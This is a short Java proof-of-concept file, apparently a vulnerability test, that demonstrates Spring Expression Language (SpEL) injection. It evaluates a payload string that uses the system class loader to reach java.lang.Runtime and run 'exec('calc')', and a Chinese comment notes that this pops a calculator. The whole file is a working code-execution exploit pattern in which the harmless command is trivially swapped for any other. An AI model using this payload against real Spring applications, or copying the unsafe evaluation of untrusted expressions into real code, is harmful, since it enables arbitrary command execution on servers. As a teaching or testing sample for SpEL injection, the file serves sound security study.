package com.example.vul;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class SpelVulTest {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException {
        String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";
        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}